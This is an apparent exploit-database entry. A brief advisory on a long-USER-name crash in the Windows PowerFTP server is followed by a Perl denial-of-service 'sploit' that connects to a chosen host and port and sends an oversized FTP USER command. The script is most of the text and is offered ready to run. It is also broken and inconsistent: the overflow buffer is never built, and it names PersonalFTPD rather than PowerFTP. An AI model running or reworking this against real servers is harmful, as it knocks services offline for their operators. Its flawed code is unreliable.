source: http://www.securityfocus.com/bid/5899/info
 
PowerFTP server is a shareware ftp server available for the Microsoft Windows platform. It is distributed and maintained by Cooolsoft.
 
It has been reported that PowerFTP server does not properly handle long user names. When excessive data is supplied as an argument to the FTP 'USER' command, the server becomes unstable. Exploitation of this vulnerability typically results in a crash of the server, requiring a manual restart to resume FTP service. 

#!/usr/bin/perl
use IO::Socket;

##########################################################
#                                                        #
# Remote Stack Overflow sploit for PersonalFTPD          #
# If wanna talk with me find me on irc                   #
# irc.irochka.net #dwc, #global, #phreack                #
# ###################################################### #
# thanx to kabuto, drG4njubas, fnq                       #
# gr33tz to dhg, gipshack, rsteam, blacktigerz           #
# D4rkGr3y, r4ShRaY, DethSpirit, J0k3r, Foster, nik0     #
# ORB, Moby, 3APA3A, euronymous, L0vCh1Y, d1z            #
# ###################################################### #
# Vulnerability links:                                   #
# http://security.nnov.ru/search/document.asp?docid=4309 #
# http://www.securityfocus.com/archive/1/316958          #
#                                                        #
##########################################################

$data = "A";

print "[..] ::::::::::::::::::::::::::::::::::::::::::::: [..]\n";
print "[..] Remote Stack Overflow sploit for PersonalFTPD [..]\n";
print "[..]      by subj | dwc :: big 10x to Kabuto       [..]\n";
print "[..]    www.dwcgr0up.com www.dwcgr0up.com/subj/    [..]\n";
print "[..] ::::::::::::::::::::::::::::::::::::::::::::: [..]\n\n";

$count_param=@ARGV;
$n="0";
if ($count_param==0) {print "Usage: -h - host, -p - port, -b - buffer
size\n\n"; exit; }
while ($n<$count_param) {
if ($ARGV[$n] eq "-h") {$server=$ARGV[$n+1];}
if ($ARGV[$n] eq "-p") {$port=$ARGV[$n+1];}
if ($ARGV[$n] eq "-b") {$buf=$ARGV[$n+1];}
$n++;
}
&connect;

sub connect
{
$sock = IO::Socket::INET->new(PeerAddr => "$server", PeerPort => "$port",
Proto => "tcp")
        || die "Can\'t connect to $server port $port\n";
print $sock "USER $buffer\n";
print "Buffer has beens sended...";

}


close($sock);
exit;

